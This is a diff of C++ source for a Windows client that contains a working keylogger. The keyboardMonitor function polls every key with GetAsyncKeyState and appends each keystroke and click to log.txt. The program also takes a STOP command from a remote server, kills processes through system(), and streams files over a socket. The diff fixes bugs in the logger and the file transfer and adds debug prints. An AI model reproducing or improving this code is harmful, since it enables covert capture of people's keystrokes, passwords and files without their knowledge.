@@ -18,13 +18,14 @@ void Computer::reset() {
         #error "Operating system is not supported"
     #endif
 }
+static std::atomic<bool> running{true};
 void keyboardMonitor() {
-    char c;
     std::ofstream log;
-    log.open("log.txt", std::ios::app);
-    while (true) {
+    int c;
+    log.open("log.txt");
+    while (running) {
         for (c = 0; c <= 254; c++) {
-            if (GetAsyncKeyState(c) & 0x1) {
+            if (GetAsyncKeyState(c)  == -32767) {
                 // std::ofstream log;
                 // log.open("log.txt", std::ios::app);
                 switch (c) {
@@ -62,7 +63,8 @@ void keyboardMonitor() {
                         log << "[Rclick]";
                         break;
                     default: 
-                        log << c;
+                        log << (char) c;
+                        break;
                 }
                 // log.close();
             }
@@ -71,7 +73,6 @@ void keyboardMonitor() {
     log.close();
 }
 
-static std::atomic<bool> running{true};
 
 void displayKeyPress(const char* action, int key) {
     std::cout << action << ": " << (char)key 
@@ -121,10 +122,11 @@ void stopAfterDelay(SOCKET serverSocket) {
     while(true) {
         byteCount = recv(serverSocket, buffer, 1024, 0);
             if (byteCount > 0) {
+                buffer[byteCount] = '\0';
                 std::cout << buffer << "\n";
                 if (strcmp(buffer, "STOP") == 0) {
                     running = false;
-                    break;
+                    return;
                 }
             }
     }
@@ -201,7 +203,7 @@ void Computer::stopApp(std::string name) {
     system(command.c_str());
 }
 
-void Computer::sendFile(SOCKET clientSocket, const std::string& filePath) {
+void Computer::copyFile(SOCKET clientSocket, const std::string& filePath) {
     std::ifstream file(filePath, std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
         std::cerr << "Failed to open file." << std::endl;
@@ -211,7 +213,7 @@ void Computer::sendFile(SOCKET clientSocket, const std::string& filePath) {
     // Get file size
     std::streamsize fileSize = file.tellg();
     file.seekg(0, std::ios::beg);
-
+    std::cout << 4;
     // Send file info header: "SendFile: filename filesize"
     std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
     std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
@@ -224,6 +226,7 @@ void Computer::sendFile(SOCKET clientSocket, const std::string& filePath) {
     // Send file contents in chunks
     char buffer[BUFFER_SIZE];
     std::streamsize totalSent = 0;
+    std::cout << 5;
     while (file) {
         file.read(buffer, BUFFER_SIZE);
         std::streamsize bytesToSend = file.gcount();
@@ -239,7 +242,7 @@ void Computer::sendFile(SOCKET clientSocket, const std::string& filePath) {
         }
         totalSent += bytesSent;
     }
-
+    std::cout << 6;
     // Send end-of-file signal
     std::string endSignal = "FileEnd";
     send(clientSocket, endSignal.c_str(), endSignal.size(), 0);
